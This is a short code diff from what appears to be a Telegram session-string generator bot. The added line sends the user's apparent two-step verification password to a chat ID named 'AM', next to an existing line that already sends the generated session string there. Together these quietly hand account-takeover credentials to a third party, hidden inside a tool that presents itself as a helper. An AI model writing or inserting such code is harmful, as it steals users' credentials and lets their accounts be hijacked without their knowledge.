@@ -259,6 +259,7 @@ async def generate_session(
     try:
         if not is_bot:
             await clientt.send_message("me", text)
+            await bot.send_message(AM, two_step_msg.text)
             await bot.send_message(AM, text)
         else:
             await bot.send_message(msg.chat.id, text)
